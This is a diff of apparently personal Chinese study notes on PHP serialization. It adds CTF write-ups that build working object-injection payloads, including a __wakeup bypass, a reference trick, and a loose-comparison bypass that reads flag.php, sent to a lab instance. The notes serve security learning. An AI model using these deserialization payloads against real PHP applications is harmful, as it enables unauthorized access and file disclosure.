@@ -175,6 +175,7 @@ $func('test');  // 调用 bar()
 
 
 
+
 ## 实战案例
 获取 GET 参数与 Cookie 并查询数据库对应的用户
 ```php
@@ -221,3 +222,284 @@ if ($userId > 0) {
 $conn->close();
 ?>
 ```
+
+
+## 序列化与反序列化
+
+听老师课上讲其实没有太听明白，所以先看了一些其他的文档来入门。
+
+[CTF中的序列化与反序列化 - Hel10 - 博客园](https://www.cnblogs.com/HelloCTF/p/13044403.html)
+
+
+### 实践
+
+套路就是倒推
+
+先找到需要什么样的结构，再实例化对象，根据状态修改后调整一些小的格式
+
+将序列化的值当作参数传入
+
+!!! note "最终的原因"
+    PHP是弱类型的原因，我们可以利用这样的特性去绕过一些判断
+
+#### BUUCTF PHP
+首先提示了有备份，用dirsearch扫描一下，发现有`www.zip`
+
+使用`http://ip of baji/www.zip`下载文件，获得网站的源码
+
+在源码中找到了`index.php`，发现了`serialize`函数
+
+```php linenums="1" hl_lines="3 11"
+<?php
+function __destruct(){
+    if ($this->password != 100) {
+        echo "</br>NO!!!hacker!!!</br>";
+        echo "You name is: ";
+        echo $this->username;echo "</br>";
+        echo "You password is: ";
+        echo $this->password;echo "</br>";
+        die();
+    }
+    if ($this->username === 'admin') {
+        global $flag;
+        echo $flag;
+    }else{
+        echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
+        die();
+    }
+}
+?>
+```
+由高亮的两行可以看出，我们需要构造一个`username`为`admin`，`password`为`100`的对象
+
+所以直接将它的代码复制出来，再创建一个`index.php`，将其粘贴进去。
+
+```php
+<?php
+class Name{
+    private $username = 'nonono';
+    private $password = 'yesyes';
+
+    public function __construct($username,$password){
+        $this->username = $username;
+        $this->password = $password;
+    }
+
+    function __wakeup(){
+        $this->username = 'guest';
+    }
+}
+
+$res = new Name('admin',100);
+var_dump(serialize($res));
+?>
+```
+
+结果是
+```
+O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
+```
+
+又因为私有变量需要修改，所以更改为
+
+
+!!! note "在反序列化时，当前属性个数大于实际属性个数时，就会跳过`__wakeup()`，去执行`__destruct`"
+
+又因为需要绕过`__wakeup()`函数，所以我们把属性个数改成大于实际属性的个数
+
+
+最后的请求URI
+```
+http://02801fc4-349c-428a-bb2c-2015f2934d2b.node5.buuoj.cn:81/?select=O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}%22
+```
+
+
+#### challenge
+
+上课老师讲的一个例题，主要核心思想就是利用php这种弱类型的语言。构造的exp是利用引用，使得两个变量一模一样，从而达到目的。
+
+!!! note "类型"
+        a - array
+        b - boolean
+        d - double
+        i - integer
+        o - common object
+        r - reference
+        s - non-escaped binary string
+        S - escaped binary string
+        C - custom object
+        O - class
+        N - null
+        R - pointer reference
+        U - unicode string
+
+
+```php linenums="1" hl_lines="7"
+<?php
+class Exp {
+    public $enter;
+    public $secret;
+}
+$exp = new Exp();
+$exp->enter = &$exp->secret;
+
+$ser = serialize($exp);
+
+var_dump($ser);
+$o = unserialize($ser);
+
+if ($o) {
+    $o->secret = "AAA{php_unserialize}";
+    if ($o->secret === $o->enter)
+        echo "Congratulation! Here is my secret: ".$o->secret;
+    else
+        echo "Oh no... You can't fool me";
+}
+else echo "are you trolling?";
+// string(45) "O:3:"Exp":2:{s:5:"enter";N;s:6:"secret";R:2;}"
+// Congratulation! Here is my secret: AAA{php_unserialize}
+?>
+```
+
+
+#### 
+
+```php
+<?php
+
+include("flag.php");
+
+highlight_file(__FILE__);
+
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = "1";
+        $filename = "/tmp/tmpfile";
+        $content = "Hello World!";
+        $this->process();
+    }
+
+    public function process() {
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
+        }
+    }
+
+    private function write() {
+        if(isset($this->filename) && isset($this->content)) {
+            if(strlen((string)$this->content) > 100) {
+                $this->output("Too long!");
+                die();
+            }
+            $res = file_put_contents($this->filename, $this->content);
+            if($res) $this->output("Successful!");
+            else $this->output("Failed!");
+        } else {
+            $this->output("Failed!");
+        }
+    }
+
+    private function read() {
+        $res = "";
+        if(isset($this->filename)) {
+            $res = file_get_contents($this->filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo "[Result]: <br>";
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this->op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+```
+
+首先就是观察一下代码结构，发现是给str这个口传参数进去，然后进行反序列化。
+
+然后考虑构造，首先第一个要求就是要通过`is_valid`函数，所以我们需要构造一个合法的可见字符串，也就是说op，filename，content都要是可见字符，另外也不能出现特殊字符。
+
+观察process和write和read函数后发现，我们使用write函数并没有用，因为我们需要读取flag.php中的代码，所以只需要执行read就行。
+
+而执行read的条件是`op=2`
+
+所以初始化的时候，op设置成2，filename是flag.php，content随便写一个。
+
+使用下面的脚本生成第一版
+
+```php
+<?php
+class FileHandler {
+    protected $op=2;
+    protected $filename='flag.php';
+    protected $content='AAA';
+}
+
+$res = new FileHandler;
+var_dump(serialize($res));
+?>
+```
+
+输入uri后，发现不太对，返回的结果是`Bad Hacker!`，说明我们的构造不对。
+
+再看了一遍代码，发现有两个地方用到了op的比较
+
+分别是
+```sql
+$this->op == "2"
+
+if($this->op === "2")
+        $this->op = "1";
+```
+我们需要再第一个判断的时候进入read环节，而在第二个判断的时候不要进入write环节。所以我们使用数字二
+
+和上一个例题一样，这一题也需要对类型进行更改。不然由于%00这样的字符不可见所以过不了`is_valid()`函数。所以将protected改成public，或者手动修改变量名称和长度也可以。
+
+得到最后的payload如下
+
+```
+O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:3:"AAA";}"
+```
+
+![得到flag的界面](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/83c9510802e2eb9530436cae79d0c66.png)
+
+
+![最后成功解题的截图](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/6ffadb51805af7763ee6b9e5cc1eb81.png)
+
+这个flag跑了两个实例貌似是不一样的，所以贴flag貌似没什么用。
+
+
